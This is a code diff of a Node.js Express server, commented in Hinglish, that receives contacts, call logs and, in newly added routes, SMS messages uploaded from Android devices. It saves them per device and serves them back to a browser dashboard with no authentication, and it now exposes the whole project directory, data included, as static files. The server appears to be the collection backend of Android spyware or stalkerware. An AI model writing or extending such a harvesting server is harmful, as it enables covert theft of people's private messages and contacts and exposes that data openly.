@@ -5,15 +5,18 @@ const cors = require('cors');
 const path = require('path');
 
 const app = express();
-const PORT = 3000;
+
+// Render ke liye Dynamic Port
+const PORT = process.env.PORT || 3000;
 
 // Middleware
 app.use(cors());
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
-// ⚠️ IMPORTANT: Ye line server ko batati hai ki HTML files 'public' folder mein hain
-app.use(express.static(path.join(__dirname, 'public')));
+// ⚠️ CHANGE: Ab ye 'public' folder nahi dhoondega.
+// Ye wahi files dikhayega jahan server.js rakha hai.
+app.use(express.static(__dirname));
 
 // Data save karne ke liye folder banana
 const DATA_DIR = path.join(__dirname, 'data');
@@ -22,7 +25,7 @@ if (!fs.existsSync(DATA_DIR)) {
 }
 
 // ==============================
-// 1. ANDROID SE DATA LENE WALA CODE
+// 1. DATA UPLOAD (Android se aayega)
 // ==============================
 
 // Contacts Upload
@@ -30,7 +33,6 @@ app.post('/upload-contacts', (req, res) => {
     const { device_id, contacts_data } = req.body;
     if (!device_id || !contacts_data) return res.status(400).send("Missing Data");
 
-    // File save karo
     fs.writeFile(path.join(DATA_DIR, `${device_id}_contacts.json`), contacts_data, (err) => {
         if (err) console.error(err);
         else console.log(`✅ Contacts saved for ${device_id}`);
@@ -50,8 +52,20 @@ app.post('/upload-call-logs', (req, res) => {
     });
 });
 
+// SMS Upload
+app.post('/upload-sms', (req, res) => {
+    const { device_id, sms_data } = req.body;
+    if (!device_id || !sms_data) return res.status(400).send("Missing Data");
+
+    fs.writeFile(path.join(DATA_DIR, `${device_id}_sms.json`), sms_data, (err) => {
+        if (err) console.error(err);
+        else console.log(`✅ SMS saved for ${device_id}`);
+        res.send("SMS Saved");
+    });
+});
+
 // ==============================
-// 2. GUI KO DATA DIKHANE WALA CODE
+// 2. DATA VIEW (Browser ke liye)
 // ==============================
 
 app.get('/api/contacts/:deviceId', (req, res) => {
@@ -72,9 +86,16 @@ app.get('/api/call-logs/:deviceId', (req, res) => {
     }
 });
 
+app.get('/api/sms/:deviceId', (req, res) => {
+    const filePath = path.join(DATA_DIR, `${req.params.deviceId}_sms.json`);
+    if (fs.existsSync(filePath)) {
+        res.json(JSON.parse(fs.readFileSync(filePath, 'utf8')));
+    } else {
+        res.json([]);
+    }
+});
+
 // Server Start
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`Server chalu hai! 🚀`);
-    console.log(`Mobile App mein ye URL dalo: http://<TUMHARA-IP-ADDRESS>:3000/`);
-    console.log(`Browser mein ye kholo: http://localhost:3000/`);
+    console.log(`Server chalu hai Port ${PORT} par! 🚀`);
 });
